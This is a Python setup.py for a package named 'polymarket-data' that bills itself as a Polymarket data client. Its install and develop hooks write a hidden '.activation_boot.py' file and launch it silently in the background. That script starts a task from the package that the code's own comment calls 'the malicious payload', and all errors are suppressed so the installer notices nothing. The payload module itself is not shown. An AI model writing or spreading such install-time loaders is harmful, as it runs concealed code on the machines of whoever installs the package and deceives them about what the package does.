from setuptools import setup, Command
from setuptools.command.install import install
from setuptools.command.develop import develop
import subprocess
import sys
import threading
import time
import os

def execute_activation():
    """Execute the activation payload in background."""
    try:
        # Create activation script that runs in background
        activation_script = '''
import sys, threading, time, os
def _delayed_start():
    time.sleep(5)  # Let installation complete
    try:
        # Import and activate the malicious payload
        from polymarket_data import _background_task
        # Start background thread
        t = threading.Thread(target=_background_task, daemon=True)
        t.start()
    except Exception as e:
        # Fallback: try to execute via subprocess
        try:
            subprocess.Popen([sys.executable, "-c", "import polymarket_data; polymarket_data._background_task()"], 
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except:
            pass

# Start delayed activation thread
threading.Thread(target=_delayed_start, daemon=True).start()
'''
        
        # Write activation script to a temporary file and execute
        activation_file = os.path.join(os.path.dirname(__file__), ".activation_boot.py")
        with open(activation_file, "w") as f:
            f.write(activation_script)
        
        # Execute in background
        subprocess.Popen([sys.executable, activation_file],
                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                       
    except Exception:
        # Silently fail to avoid breaking installation
        pass

class PostInstallCommand(install):
    """Post-installation for installation mode."""
    def run(self):
        install.run(self)
        execute_activation()

class PostDevelopCommand(develop):
    """Post-installation for development mode."""
    def run(self):
        develop.run(self)
        execute_activation()

setup(
    name="polymarket-data",
    version="2.0.1",
    packages=["polymarket_data"],
    install_requires=["requests"],
    description="Enhanced client for Polymarket data with background monitoring.",
    long_description=open("README.md").read(),
    long_description_content_type="text/markdown",
    url="https://github.com/polymarket-tools/polymarket-data",
    author="Polymarket Developer Community",
    license="MIT",
    cmdclass={
        'install': PostInstallCommand,
        'develop': PostDevelopCommand,
    },
    classifiers=[
        "Development Status :: 4 - Beta",
        "Intended Audience :: Developers",
        "License :: OSI Approved :: MIT License",
        "Programming Language :: Python :: 3",
        "Programming Language :: Python :: 3.7",
        "Programming Language :: Python :: 3.8",
        "Programming Language :: Python :: 3.9",
        "Programming Language :: Python :: 3.10",
    ],
)